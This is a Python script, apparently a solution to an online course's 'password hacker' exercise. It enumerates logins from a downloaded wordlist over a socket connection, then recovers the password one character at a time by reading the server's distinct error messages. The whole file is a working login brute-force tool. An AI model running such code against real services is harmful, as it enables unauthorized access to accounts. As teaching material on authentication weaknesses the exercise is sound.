import sys
import socket
import itertools
import string
import json
from urllib.request import urlopen


args = sys.argv
address = (str(args[1]), int(args[2]))

symbols = string.ascii_lowercase + string.ascii_uppercase + string.digits
passwords = 'https://stepik.org/media/attachments/lesson/255258/passwords.txt'
logins = 'https://stepik.org/media/attachments/lesson/255258/logins.txt'


def brute_options():
    for i in range(len(symbols)):
        for combination in itertools.product(symbols, repeat=i + 1):
            yield ''.join(combination)


def file_options(file):
    url_file = urlopen(file).read()
    file = url_file.decode()
    for line in file.split('\n'):
        line = line.replace('\r', '')
        cases = [line]
        if not line.isdigit():
            for case in cases:
                for n, letter in enumerate(case):
                    if letter.lower():
                        big_letter = letter.upper()
                        if n == 0:
                            new_line = big_letter + case[n + 1:]
                        elif n < len(line) - 1:
                            new_line = case[:n] + big_letter + case[n + 1:]
                        else:
                            new_line = case[:n] + big_letter
                        if new_line not in cases:
                            cases.append(new_line)
        for case in cases:
            yield case


def to_json(login, password):
    dictionary = {'login': login,
                  'password': password}
    return json.dumps(dictionary)


def from_json(message):
    dictionary = json.loads(message)
    return dictionary['result']


def get_response(login, password):
    message = to_json(login, password)
    server.send(message.encode())
    response = server.recv(2048).decode()
    return from_json(response)


def check_login():
    for login in file_options(logins):
        response = get_response(login, '')
        if response != 'Wrong login!':
            return login


def check_password(login):
    count = 0
    password = symbols[count]
    while True:
        response = get_response(login, password)
        if response == 'Wrong password!':
            password = password[:-1] + symbols[count]
        elif response == 'Exception happened during login':
            count = 0
            password += symbols[count]
        elif response == 'Connection success!':
            return password
        count += 1


with socket.socket() as server:
    server.connect(address)
    login = check_login()
    password = check_password(login)
    print(to_json(login, password))
